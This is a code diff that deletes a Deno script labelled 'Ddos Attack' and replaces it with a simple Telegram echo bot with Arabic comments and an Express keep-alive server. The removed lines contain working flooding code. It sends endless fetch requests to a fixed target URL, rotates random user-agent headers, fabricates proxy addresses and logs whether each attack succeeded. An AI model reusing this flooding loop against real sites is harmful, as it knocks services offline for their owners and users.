@@ -1,92 +1,33 @@
-// Import from CDN (esm.sh or similar)
-import figlet from 'https://esm.sh/figlet';
-import UserAgents from 'https://esm.sh/user-agents';
-// import HttpsProxyAgent from 'https://esm.sh/https-proxy-agent'; // Deno doesn't support this natively in fetch agent
+// 📦 استدعاء المكتبات
+import TelegramBot from "npm:node-telegram-bot-api";
+import express from "npm:express";
 
-// Colors
-const F = '\x1b[1;32m';
-const Z = '\x1b[1;31m';
-const S = '\x1b[1;33m';
-const B = '\x1b[38;5;208m';
+// 🔐 ضع توكن البوت هنا
+const token = "توكن_البوت_هنا"; // ← استبدله بتوكن البوت
 
-console.log(`${F}[✓] All libraries loaded and ready to use!${Z}`);
+// 🛰️ إنشاء البوت (بنمط الاستطلاع polling)
+const bot = new TelegramBot(token, { polling: true });
 
-// Logo
-const logo = figlet.textSync('Ddos Attack', { font: 'Slant' });
-console.log(logo);
+// 📬 عندما يستقبل البوت رسالة
+bot.on("message", (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text;
 
-// Target
-const url = 'https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/';
+  // رد بسيط
+  if (text === "/start") {
+    bot.sendMessage(chatId, "أهلاً! أنا شغال 24/7 😉");
+  } else {
+    bot.sendMessage(chatId, `أرسلت: ${text}`);
+  }
+});
 
-// Main function
-function linked() {
-    const sg = '2';
-    if (sg === '1') {
-        for (let i = 0; i < 50000; i++) {
-            AttackMahos();
-        }
-    } else if (sg === '2') {
-        for (let i = 0; i < 500000000000; i++) {
-            ProxyAttack();
-        }
-    }
-}
+// 🌐 إعداد سيرفر Express للحفاظ على النشاط (keep alive)
+const app = express();
+app.get("/", (req, res) => {
+  res.send("✅ البوت شغال!");
+});
 
-// AttackMahos function
-async function AttackMahos() {
-    const userAgents = new UserAgents();
-    while (true) {
-        const headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-us,en;q=0.5',
-            'Accept-Encoding': 'gzip,deflate',
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Keep-Alive': '115',
-            'Connection': 'keep-alive',
-            'User-Agent': userAgents.random().toString()
-        };
-        try {
-            const req = await fetch(url, { headers });
-            if (req.status === 200) {
-                console.log(`${F}GOOD Attack: ${url}`);
-            } else {
-                console.log(`${Z}BAD Attack: ${url}`);
-            }
-        } catch {
-            console.log(`${S}DOWN: ${url}`);
-        }
-    }
-}
-
-// ProxyAttack function (no real proxy agent support in fetch for Deno)
-async function ProxyAttack() {
-    const userAgents = new UserAgents();
-    while (true) {
-        const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
-        const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
-        const port = pl[Math.floor(Math.random() * pl.length)];
-        const proxy = `${ip}:${port}`;
-        const headers = {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-us,en;q=0.5',
-            'Accept-Encoding': 'gzip,deflate',
-            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
-            'Keep-Alive': '115',
-            'Connection': 'keep-alive',
-            'User-Agent': userAgents.random().toString()
-        };
-        try {
-            // Proxy not used here due to fetch limitations in Deno
-            const req = await fetch(url, { headers });
-            if (req.status === 200) {
-                console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
-            } else {
-                console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
-            }
-        } catch {
-            console.log(`${S}DOWN: ${url} |`);
-        }
-    }
-}
-
-linked();
+const PORT = Deno.env.get("PORT") || 4000;
+app.listen(PORT, () => {
+  console.log(`🚀 السيرفر يعمل على المنفذ ${PORT}`);
+});
